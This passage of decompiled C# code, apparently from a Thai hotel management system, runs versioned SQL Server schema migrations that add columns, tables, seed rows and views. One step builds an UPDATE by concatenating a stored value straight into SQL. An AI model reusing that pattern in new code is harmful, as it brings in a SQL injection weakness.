			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('205','หน\u0e35\u0e49ส\u0e34นอ\u0e37\u0e48นๆ')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20501','หน\u0e35\u0e49ส\u0e34นอ\u0e37\u0e48นๆ')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('206','เง\u0e34นร\u0e31บฝาก')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20601','เง\u0e34นร\u0e31บฝาก')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('301','ท\u0e38น')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('30101','ซ\u0e37\u0e49อส\u0e34นค\u0e49า')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('30102','ถอนใช\u0e49ส\u0e48วนต\u0e31ว')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('401','รายได\u0e49จ\u0e31ดเก\u0e47บเอง')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('40101','รายได\u0e49ค\u0e48าซ\u0e48อมรถยนต\u0e4c')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('40102','รายได\u0e49บร\u0e34การปร\u0e36กษา')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('40103','ดอกเบ\u0e35\u0e49ยร\u0e31บ')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('40104','รายได\u0e49อ\u0e37\u0e48น ๆ')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('501','งบกลาง')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('50101','งบกลาง')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('502','งบบ\u0e38คลากร')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('50201','เง\u0e34นเด\u0e37อน')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('503','งบดำเน\u0e34นงาน')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('50301','ค\u0e48าว\u0e31สด\u0e38')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('50302','ค\u0e48าสาธารณ\u0e39ปโภค')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('50303','ค\u0e48าตอบแทน')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('504','งบลงท\u0e38น')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('50401','ค\u0e48าคร\u0e38ภ\u0e31ณฑ\u0e4c')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('50402','ค\u0e48าท\u0e35\u0e48ด\u0e34นและส\u0e34\u0e48งก\u0e48อสร\u0e49าง')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('505','งบรายจ\u0e48ายอ\u0e37\u0e48น ๆ')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('50501','งบรายจ\u0e48ายอ\u0e37\u0e48น ๆ')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('506','งบเง\u0e34นอ\u0e38ดหน\u0e38น')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('50601','งบเง\u0e34นอ\u0e38ดหน\u0e38น')");
			num = 7;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(7) + "'");
		}
		if (num < 8)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [VAT_OUT] [varchar](10)");
			Module1.connect("update TB_SETTINGS set VAT_OUT='ป\u0e34ด' ");
			num = 8;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(8) + "'");
		}
		if (num < 9)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [Vat_Head2] [varchar](50)");
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [Vat_Rows] [int] NULL");
			Module1.connect("update TB_SETTINGS set Vat_Head2='', Vat_Rows=7");
			num = 9;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(9) + "'");
		}
		if (num < 10)
		{
			Application.DoEvents();
			Module1.connect("CREATE TABLE [dbo].[HT_Book_Pro]([id] [int] IDENTITY(1,1) NOT NULL,[B_NO] [varchar](50) COLLATE Thai_CI_AS NULL,[B_ROOM] [varchar](50) COLLATE Thai_CI_AS NULL,[B_NAME] [varchar](250) COLLATE Thai_CI_AS NULL,[B_UNIT] [varchar](50) COLLATE Thai_CI_AS NULL,[B_NUM] [float] NULL,[B_PRICE] [float] NULL,[B_PRICE_TOTAL] [float] NULL,[B_PRO_ID] [int] NULL) ON [PRIMARY]");
			num = 10;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(10) + "'");
		}
		if (num < 11)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE HT_Rooms ADD [Room_Clean_Time] [varchar](30)");
			num = 11;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(11) + "'");
		}
		if (num < 12)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [Room_Clean_Time] [varchar](10)");
			Module1.connect("update TB_SETTINGS set [Room_Clean_Time] ='30'");
			num = 12;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(12) + "'");
		}
		if (num < 13)
		{
			Application.DoEvents();
			Module1.connect("CREATE TABLE [HT_ContinueTime]([id] [int] IDENTITY(1,1) NOT NULL,[Con_Name] [varchar](250) COLLATE Thai_CI_AS NULL,[Con_Minute] [int] NULL,[Con_Price] [float] NULL,[Con_Type] [varchar](50) COLLATE Thai_CI_AS NULL) ON [PRIMARY]");
			num = 13;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(13) + "'");
		}
		if (num < 14)
		{
			Application.DoEvents();
			Module1.connect("DROP VIEW [View_CheckIn_Ds]");
			Module1.connect("CREATE VIEW [View_CheckIn_Ds] AS SELECT     HT_CheckIn_Ds.id, HT_CheckIn_H.Cin_no, HT_CheckIn_H.Cin_Date, HT_CheckIn_H.Cin_Book_no, HT_CheckIn_H.Cin_cust_no, HT_CheckIn_H.Cin_cust_price, HT_CheckIn_H.Cin_Car_type, HT_CheckIn_H.Cin_Car_id, HT_CheckIn_H.Cin_status, HT_CheckIn_H.Total_Price_Room, HT_CheckIn_H.Total_Price_Product,  HT_CheckIn_H.Total_Price_Net, HT_CheckIn_H.Total_Price_Pay, HT_CheckIn_H.Total_Price_Balance, HT_CheckIn_Ds.Cin_Room_No, HT_CheckIn_Ds.Cin_Room_Type,  HT_CheckIn_Ds.Cin_Room_In, HT_CheckIn_Ds.Cin_Room_Out, HT_CheckIn_Ds.Cin_Room_Status, HT_CheckIn_Ds.Cin_Room_Dep, HT_CheckIn_Ds.Cin_Room_Price,  HT_CheckIn_Ds.Cin_Room_Night, HT_CheckIn_Ds.Cin_Room_PriceToTal, HT_CheckIn_Ds.Cin_Room_Pay_Before, HT_CheckIn_Ds.Cin_Room_Pay_Total,  HT_Customers.Cust_name + ' ' + HT_Customers.Cust_name2 AS Cin_cust_name, HT_Customers.Cust_Add_tel AS Cin_cust_tel, HT_CheckIn_H.Cin_Room_ALL,  HT_CheckIn_H.Total_Price_vat, HT_CheckIn_H.Cin_by, HT_CheckIn_Ds.Cin_Dep_Status, HT_CheckIn_Ds.Dep_by, HT_CheckIn_Ds.Cin_cupon,  HT_CheckIn_Ds.Cin_Dep_return_date, HT_CheckIn_Ds.Cin_Dep_return_by, HT_CheckIn_Ds.Cin_note, HT_Customers.Cust_Type_Main, HT_CheckIn_H.Cin_type,  HT_CheckIn_H.Cin_foreign FROM         HT_CheckIn_H INNER JOIN HT_CheckIn_Ds ON HT_CheckIn_H.Cin_no = HT_CheckIn_Ds.Cin_No INNER JOIN HT_Customers ON HT_CheckIn_H.Cin_cust_no = HT_Customers.Cust_no");
			num = 14;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(14) + "'");
		}
		if (num < 15)
		{
			Application.DoEvents();
			Module1.connect("DROP VIEW [View_Round_Bill]");
			Module1.connect("CREATE VIEW [View_Round_Bill] AS SELECT     id, round_no, round_price, round_by, round_start, round_end, CASE WHEN round_end IS NULL THEN (SELECT     COALESCE (SUM(Cin_Pay_cash) * - 1, 0) AS Expr1  FROM          View_Pay_H WHERE      Cin_Pay_cash < 0 AND (Cin_Pay_Date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_Pay_cash) * - 1, 0) AS Expr1  FROM          View_Pay_H  WHERE      Cin_Pay_cash < 0 AND (Cin_Pay_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS round_price_pay, CASE WHEN round_end IS NULL  THEN (SELECT     COALESCE (SUM(Cin_Pay_cash), 0) AS Expr1  FROM          View_Pay_H  WHERE      Cin_Pay_cash > 0 AND (Cin_Pay_Date >= dbo.HT_Round_Bill.round_start)) ELSE  (SELECT     COALESCE (SUM(Cin_Pay_cash), 0) AS Expr1  FROM          View_Pay_H  WHERE      Cin_Pay_cash > 0 AND (Cin_Pay_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS round_price_rec, CASE WHEN round_end IS NULL  THEN (SELECT     COALESCE (SUM(Cin_Pay_credit), 0) AS Expr1 FROM          View_Pay_H  WHERE      Cin_Pay_credit > 0 AND (Cin_Pay_Date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_Pay_credit), 0) AS Expr1 FROM          View_Pay_H WHERE      Cin_Pay_credit > 0 AND (Cin_Pay_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS round_price_credit, CASE WHEN round_end IS NULL   THEN (SELECT     COALESCE (SUM(Cin_room_dep), 0) AS Expr1 FROM          View_CheckIn_Ds WHERE      Cin_status = 'ปกต\u0e34' AND (Cin_Date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_room_dep), 0) AS Expr1  FROM          View_CheckIn_Ds WHERE      Cin_status = 'ปกต\u0e34' AND (Cin_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS Dep_Rec, CASE WHEN round_end IS NULL THEN (SELECT     COALESCE (SUM(Cin_room_dep), 0) AS Expr1 FROM          View_CheckIn_Ds  WHERE      Cin_status = 'ปกต\u0e34' AND (Cin_dep_return_date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_room_dep), 0) AS Expr1 FROM          View_CheckIn_Ds  WHERE      Cin_status = 'ปกต\u0e34' AND (Cin_dep_return_date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS Dep_pay, CASE WHEN round_end IS NULL  THEN 'รอบป\u0e31จจ\u0e38บ\u0e31น [ ' + round_by + ']' ELSE '[ ' + RIGHT(CAST('000000' + CAST(id AS varchar) AS varchar), 6) + ' ] ' + CONVERT(varchar, Round_start, 3) + ' ' + CONVERT(varchar, Round_start, 108)   + ' ถ\u0e36ง ' + CONVERT(varchar, Round_end, 3) + ' ' + CONVERT(varchar, Round_end, 108) + ' [ ' + round_by + ']' END AS FullDate, CASE WHEN round_end IS NULL THEN (SELECT     COALESCE (SUM(Cin_Pay_Tran), 0) AS Expr1 FROM          View_Pay_H WHERE      Cin_Pay_Tran > 0 AND (Cin_Pay_Date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_Pay_Tran), 0) AS Expr1 FROM          View_Pay_H WHERE      Cin_Pay_Tran > 0 AND (Cin_Pay_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS round_price_tran FROM         dbo.HT_Round_Bill");
			num = 15;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(15) + "'");
		}
		if (num < 16)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [SHOW_ICON] [varchar](10)");
			Module1.connect("update TB_SETTINGS set [SHOW_ICON] ='True'");
			num = 16;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(16) + "'");
		}
		if (num < 17)
		{
			Application.DoEvents();
			Module1.connect("UPDATE HT_Customers SET cust_add_tel=REPLACE(cust_add_tel,'-','')");
			Module1.connect("UPDATE HT_Customers SET cust_add_tel=REPLACE(cust_add_tel,' ','')");
			num = 17;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(17) + "'");
		}
		if (num < 18)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [Time_Logout] [varchar](10)");
			Module1.connect("update TB_SETTINGS set Time_Logout='60' ");
			num = 18;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(18) + "'");
		}
		if (num < 19)
		{
			Application.DoEvents();
			Module1.connect("UPDATE HT_Customers SET Cust_perfix = '' WHERE (Cust_perfix IS NULL)");
			num = 19;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(19) + "'");
		}
		if (num < 20)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE HT_Book_H ADD [Book_Notify_Day] [int] NOT NULL DEFAULT ((0))");
			Module1.connect("ALTER TABLE HT_Book_H ADD [Book_Notify_Note] [varchar](50)");
			Module1.connect("update HT_Book_H set Book_Notify_Day=3 ,Book_Notify_Note=''");
			num = 20;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(20) + "'");
		}
		if (num < 21)
		{
			Application.DoEvents();
			Module1.connect("DROP VIEW [View_Customers]");
			Module1.connect("CREATE VIEW [View_Customers] AS SELECT     id, Cust_no, ISNULL(CAST(Cust_perfix AS varchar(MAX)), '') + Cust_name + ' ' + Cust_name2 AS Cust_name, Cust_Type, Cust_Email, Cust_Add_no + ' หม\u0e39\u0e48 ' + Cust_Add_moo + ' ซอย' + Cust_Add_soi + ' ถนน' + Cust_Add_road + ' แขวง/ตำบล' + Cust_Add_tambon + ' เขต/อำเภอ' + Cust_Add_ampore + ' จ\u0e31งหว\u0e31ด' + Cust_Add_province + ' ' + Cust_Add_code AS C_Address, Cust_Add_tel, Cust_Add_fax, Cust_Work_Name, Cust_Work_no + ' หม\u0e39\u0e48 ' + Cust_Work_moo + ' ซอย' + Cust_Work_soi + ' ถนน' + Cust_Work_road + ' แขวง/ตำบล' + Cust_Work_tambon + ' เขต/อำเภอ' + Cust_Work_ampore + ' จ\u0e31งหว\u0e31ด' + Cust_Work_province + ' ' + Cust_Work_code AS W_Address, Cust_Work_tel, Cust_Work_fax, Cust_Type_Main, Cust_IDcard, Cust_sex, Cust_Price_Over, Cust_Work_Tax FROM         dbo.HT_Customers");
			num = 21;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(21) + "'");
		}
		if (num < 22)
		{
			Application.DoEvents();
			Module1.connect("CREATE TABLE [HT_POWER_LOG]([id] [int] IDENTITY(1,1) NOT NULL,[ROOM_NO] [varchar](50) COLLATE Thai_CI_AS NULL,[ROOM_POWER_START] [datetime] NULL,[ROOM_POWER_END] [datetime] NULL,[ROOM_POWER_START_BY] [varchar](50) COLLATE Thai_CI_AS NULL,[ROOM_POWER_END_BY] [varchar](50) COLLATE Thai_CI_AS NULL,[ROOM_POWER_NOTE] [varchar](250) COLLATE Thai_CI_AS NULL,[ROOM_POWER_NOTE2] [varchar](250) COLLATE Thai_CI_AS NULL)");
			num = 22;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(22) + "'");
		}
		if (num < 23)
		{
			Application.DoEvents();
			Module1.connect("CREATE TABLE [HT_INVOICE]([INV_NO] [int] NOT NULL,[INV_booking_no] [varchar](50) COLLATE Thai_CI_AS NULL,[INV_STAY] [varchar](100) COLLATE Thai_CI_AS NULL,[INV_DATE] [datetime] NULL,[INV_BY] [varchar](50) COLLATE Thai_CI_AS NULL,[INV_TITLE] [varchar](400) COLLATE Thai_CI_AS NULL,[INV_NAME] [varchar](300) COLLATE Thai_CI_AS NULL,[INV_COMPANY] [varchar](300) COLLATE Thai_CI_AS NULL,[INV_ADDRESS] [varchar](500) COLLATE Thai_CI_AS NULL,[INV_TEL] [varchar](50) COLLATE Thai_CI_AS NULL,[INV_NIGHT] [varchar](20) COLLATE Thai_CI_AS NULL,[INV_PAX] [varchar](20) COLLATE Thai_CI_AS NULL,[INV_PAX_CHILD] [varchar](20) COLLATE Thai_CI_AS NULL,[INV_PAYMENT] [varchar](50) COLLATE Thai_CI_AS NULL,[INV_DUEDATE] [datetime] NULL,[INV_NOTE] [text] COLLATE Thai_CI_AS NULL)");
			num = 23;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(23) + "'");
		}
		if (num < 24)
		{
			Application.DoEvents();
			Module1.connect("CREATE TABLE [HT_SET_Sale]([id] [int] IDENTITY(1,1) NOT NULL,[id_full] [varchar](50) COLLATE Thai_CI_AS NULL,[name] [varchar](150) COLLATE Thai_CI_AS NULL,[tel] [varchar](50) COLLATE Thai_CI_AS NULL,[address] [varchar](400) COLLATE Thai_CI_AS NULL,[other] [varchar](500) COLLATE Thai_CI_AS NULL) ");
			Module1.connect("ALTER TABLE HT_Book_H ADD [Book_Sale] [varchar](150)");
			Module1.connect("update HT_Book_H set Book_Sale=''");
			Module1.connect("DROP VIEW [View_Book_Date]");
			Module1.connect("CREATE VIEW [View_Book_Date] AS SELECT HT_Book_Date.id, HT_Book_Date.Book_no, HT_Book_H.Book_Sale, HT_Book_Date.Book_type, HT_Book_Date.Book_date_ds, HT_Book_Date.Book_Num, HT_Book_Date.Book_USE, HT_Book_H.Book_Cust_Name, HT_Book_H.Book_Cust_Name2, HT_Book_H.Book_Date_in, HT_Book_Date.Book_ok, HT_Book_H.Book_Status,  HT_Book_H.Book_Cust_Tel, HT_Book_H.Book_room_all, HT_Book_H.Book_room_note, HT_Book_Date.Cin_no FROM HT_Book_Date INNER JOIN HT_Book_H ON HT_Book_Date.Book_no = HT_Book_H.Book_ID");
			Module1.connect("DROP VIEW [View_Booking_Ds]");
			Module1.connect("CREATE VIEW [View_Booking_Ds] AS SELECT HT_Book_Ds.Book_No, HT_Book_Ds.Book_Room_Type, HT_Book_Ds.Book_Room_Start, HT_Book_Ds.Book_Room_End, HT_Book_Ds.Book_Room_Price,  HT_Book_Ds.Book_Room_Night, HT_Book_Ds.Book_Room_Num, HT_Book_Ds.Book_Room_PriceToTal, HT_Book_Ds.Book_Room_Note, HT_Book_H.Book_Sale,HT_Book_H.Book_Date,HT_Book_H.Book_Date_in, HT_Book_H.Book_Date_out, HT_Book_H.Book_Cust_ID, HT_Book_H.Book_Cust_Name, HT_Book_H.Book_Cust_Name2, HT_Book_H.Book_Cust_Tel, HT_Book_H.Book_Price_Total, HT_Book_H.Book_Price_Pay, HT_Book_H.Book_by, HT_Book_H.Book_room_note AS Book_room_note2, HT_Book_H.Book_room_all, HT_Book_H.Book_room_type AS Book_room_type2, HT_Book_Ds.Book_status, HT_Book_H.Book_Status AS Book_Status2 FROM HT_Book_Ds INNER JOIN HT_Book_H ON HT_Book_Ds.Book_No = HT_Book_H.Book_ID");
			num = 24;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(24) + "'");
		}
		if (num < 25)
		{
			Application.DoEvents();
			Module1.connect("DROP VIEW [View_Customers]");
			Module1.connect("CREATE VIEW [View_Customers] AS SELECT id, Cust_no, ISNULL(CAST(Cust_perfix AS varchar(MAX)), '') + Cust_name + ' ' + Cust_name2 AS Cust_name, Cust_Type, Cust_Email, Cust_Add_no + ' หม\u0e39\u0e48 ' + Cust_Add_moo + ' ซอย' + Cust_Add_soi + ' ถนน' + Cust_Add_road + ' แขวง/ตำบล' + Cust_Add_tambon + ' เขต/อำเภอ' + Cust_Add_ampore + ' จ\u0e31งหว\u0e31ด' + Cust_Add_province + ' ' + Cust_Add_code AS C_Address, Cust_Add_tel, Cust_Add_fax, Cust_Work_Name, Cust_Work_no + ' หม\u0e39\u0e48 ' + Cust_Work_moo + ' ซอย' + Cust_Work_soi + ' ถนน' + Cust_Work_road + ' แขวง/ตำบล' + Cust_Work_tambon + ' เขต/อำเภอ' + Cust_Work_ampore + ' จ\u0e31งหว\u0e31ด' + Cust_Work_province + ' ' + Cust_Work_code AS W_Address, Cust_Work_tel, Cust_Work_fax, Cust_Type_Main, Cust_IDcard, Cust_sex, Cust_Price_Over, Cust_Work_Tax, Cust_Contry FROM HT_Customers ");
			Module1.connect("CREATE VIEW [View_Report_RR4] AS  SELECT HT_CheckIn_Ds.Cin_Room_In, HT_CheckIn_Ds.Cin_Room_No, View_Customers.Cust_name, View_Customers.Cust_Contry, View_Customers.Cust_IDcard, View_Customers.C_Address, HT_CheckIn_Ds.Cin_Room_Out, HT_CheckIn_H.Cin_status FROM HT_CheckIn_Ds INNER JOIN HT_CheckIn_H ON HT_CheckIn_Ds.Cin_No = HT_CheckIn_H.Cin_no INNER JOIN View_Customers ON HT_CheckIn_H.Cin_cust_no = View_Customers.Cust_no ");
			num = 25;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(25) + "'");
		}
		if (num < 26)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE HT_Changed_Room ADD [Note] [varchar](255)");
			Module1.connect("ALTER TABLE HT_Changed_Room ADD [ToPrice] [varchar](20)");
			Module1.connect("DROP VIEW [View_Changed_Room]");
			Module1.connect("CREATE VIEW [View_Changed_Room] AS  SELECT HT_Changed_Room.id, HT_Changed_Room.cin_no, HT_Changed_Room.Note, HT_Changed_Room.ToPrice, HT_Changed_Room.room_before, HT_Changed_Room.room_after, HT_Changed_Room.change_date, View_CheckIn_H.Cin_Date_in, View_CheckIn_H.Cust_name, HT_Changed_Room.room_before_price FROM HT_Changed_Room INNER JOIN View_CheckIn_H ON HT_Changed_Room.cin_no = View_CheckIn_H.Cin_no ");
			num = 26;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(26) + "'");
		}
		if (num < 27)
		{
			Application.DoEvents();
			Module1.connect("CREATE TABLE [HT_Invoice_Note]([Cin_no] [varchar](50) COLLATE Thai_CI_AS NULL,[note] [text] COLLATE Thai_CI_AS NULL) ");
			num = 27;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(27) + "'");
		}
		if (num < 28)
		{
			Application.DoEvents();
			Module1.connect("CREATE VIEW [View_Bill_Cancel] AS  SELECT HT_Rooms_Cancel.id, HT_Rooms_Cancel.room_no, HT_Rooms_Cancel.cin_no, HT_Rooms_Cancel.cancel_date, HT_Rooms_Cancel.cancel_by, HT_Rooms_Cancel.cancel_note, HT_Bill_Debt_H.Bill_Cust_ID, HT_Bill_Debt_H.Bill_Cust_Name, HT_Bill_Debt_H.Bill_Cust_Address, HT_Bill_Debt_H.Bill_Cust_Tel, HT_Bill_Debt_H.Bill_Cust_Fax, HT_Bill_Debt_H.Bill_Date, HT_Bill_Debt_H.Bill_Ref, HT_Bill_Debt_H.Bill_Price_Type, HT_Bill_Debt_H.Bill_Type, HT_Bill_Debt_H.Bill_Total, HT_Bill_Debt_H.Bill_Pay, HT_Bill_Debt_H.Bill_Debt, HT_Bill_Debt_H.Bill_Pay_CASH, HT_Bill_Debt_H.Bill_Status,   HT_Bill_Debt_H.Bill_Pay_CREDIT, HT_Bill_Debt_H.Bill_by, HT_Bill_Debt_H.Bill_Note FROM HT_Rooms_Cancel INNER JOIN HT_Bill_Debt_H ON HT_Rooms_Cancel.cin_no = HT_Bill_Debt_H.Bill_No");
			num = 28;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(28) + "'");
		}
		if (num < 29)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE HT_CheckIn_Pay ADD [Branch] [varchar](50)");
			Module1.connect("CREATE TABLE TB_SET_Branch ([id] [int] IDENTITY(1,1) NOT NULL,[id_full] [varchar](50) COLLATE Thai_CI_AS NULL,[name] [varchar](100) COLLATE Thai_CI_AS NULL)");
			Module1.connect("INSERT INTO TB_SET_Branch (id_full,name) VALUES ('1','สำน\u0e31กงานใหญ\u0e48')");
			num = 29;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(29) + "'");
		}
		if (num < 30)
		{
			Application.DoEvents();
			Module1.connect("DROP VIEW [View_Pay_Ds]");
			Module1.connect("CREATE VIEW [View_Pay_Ds] AS SELECT HT_CheckIn_Pay.Pay_no, HT_CheckIn_Pay.Cin_No, HT_CheckIn_Pay.Cin_Pay_Ds, HT_CheckIn_Pay.Cin_Pay_Cash, HT_CheckIn_Pay.Cin_Pay_Credit, HT_CheckIn_Pay.Cin_Pay_Date, HT_CheckIn_Pay.Cin_Pay_Ds_Name, HT_CheckIn_Pay.Cin_Pay_Ds_Price, HT_CheckIn_Pay.Cin_Pay_Ds_unit, HT_CheckIn_Pay.Cin_Cust_no,  View_Customers.Cust_name, View_Customers.C_Address, View_Customers.Cust_Add_tel, View_Customers.Cust_Add_fax, HT_CheckIn_Pay.Cin_Status,  HT_CheckIn_Pay.id, HT_CheckIn_Pay.Cin_Pay_Ds_ID, HT_CheckIn_Pay.Cin_Pay_Ds_Num, HT_CheckIn_Pay.Cin_Pay_Ds_PriceOne, HT_CheckIn_Pay.Cin_Pay_Ds_PriceTotal,  HT_CheckIn_Pay.Cin_Pay_Note, HT_CheckIn_Pay.Pay_by, HT_CheckIn_Pay.Cin_Pay_Free, HT_CheckIn_Pay.Cin_Pay_Tran, HT_CheckIn_Pay.Branch FROM HT_CheckIn_Pay INNER JOIN View_Customers ON HT_CheckIn_Pay.Cin_Cust_no = View_Customers.Cust_no");
			num = 30;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(30) + "'");
		}
		if (num < 31)
		{
			Application.DoEvents();
			Module1.connect("CREATE TABLE [HT_Log]([id] [int] IDENTITY(1,1) NOT NULL,[details] [varchar](250) COLLATE Thai_CI_AS NULL,[Emp_name] [varchar](150) COLLATE Thai_CI_AS NULL,[DODATE] [varchar](50) COLLATE Thai_CI_AS NULL) ");
			num = 31;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(31) + "'");
		}
		if (num < 32)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE HT_CheckIn_H ADD [Cin_Work_number]  [int] NOT NULL DEFAULT ((0))");
			num = 32;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(32) + "'");
		}
		if (num < 33)
		{
			Application.DoEvents();
			num = 33;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(33) + "'");
		}
		if (num < 34)
		{
			Application.DoEvents();
			DataSet dataSet2 = Module1.connect("select Company_Name from TB_SETTINGS");
			if (dataSet2.Tables[0].Rows.Count != 0)
			{
				Module1.connect("ALTER TABLE TB_SETTINGS ADD [CompanyName] [varchar](500) COLLATE Thai_CI_AS NULL");
				Module1.connect(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("update TB_SETTINGS set Company_Name=null,CompanyName='", dataSet2.Tables[0].Rows[0]["Company_Name"]), "'")));
			}
			num = 34;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(34) + "'");
		}
		if (num < 35)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE HT_CheckIn_Pay ADD [Cin_Pay_web] [float] NOT NULL DEFAULT ((0))");
			num = 35;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(35) + "'");
		}
		if (num < 36)
		{
			Application.DoEvents();
			Module1.connect("DROP VIEW [View_Pay_Ds]");
			Module1.connect("CREATE VIEW [View_Pay_Ds] AS SELECT HT_CheckIn_Pay.Pay_no, HT_CheckIn_Pay.Cin_No, HT_CheckIn_Pay.Cin_Pay_Ds, HT_CheckIn_Pay.Cin_Pay_Cash, HT_CheckIn_Pay.Cin_Pay_Credit, HT_CheckIn_Pay.Cin_Pay_Date, HT_CheckIn_Pay.Cin_Pay_Ds_Name, HT_CheckIn_Pay.Cin_Pay_Ds_Price, HT_CheckIn_Pay.Cin_Pay_Ds_unit, HT_CheckIn_Pay.Cin_Cust_no,  View_Customers.Cust_name, View_Customers.C_Address, View_Customers.Cust_Add_tel, View_Customers.Cust_Add_fax, HT_CheckIn_Pay.Cin_Status, HT_CheckIn_Pay.id, HT_CheckIn_Pay.Cin_Pay_Ds_ID, HT_CheckIn_Pay.Cin_Pay_Ds_Num, HT_CheckIn_Pay.Cin_Pay_Ds_PriceOne, HT_CheckIn_Pay.Cin_Pay_Ds_PriceTotal, HT_CheckIn_Pay.Cin_Pay_Note, HT_CheckIn_Pay.Pay_by, HT_CheckIn_Pay.Cin_Pay_Free, HT_CheckIn_Pay.Cin_Pay_Tran, HT_CheckIn_Pay.Branch,  HT_CheckIn_Pay.Cin_Pay_web FROM         HT_CheckIn_Pay INNER JOIN  View_Customers ON HT_CheckIn_Pay.Cin_Cust_no = View_Customers.Cust_no");
			num = 36;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(36) + "'");
		}
		if (num < 37)
		{
			Application.DoEvents();
			Module1.connect("DROP VIEW [View_Room_status]");
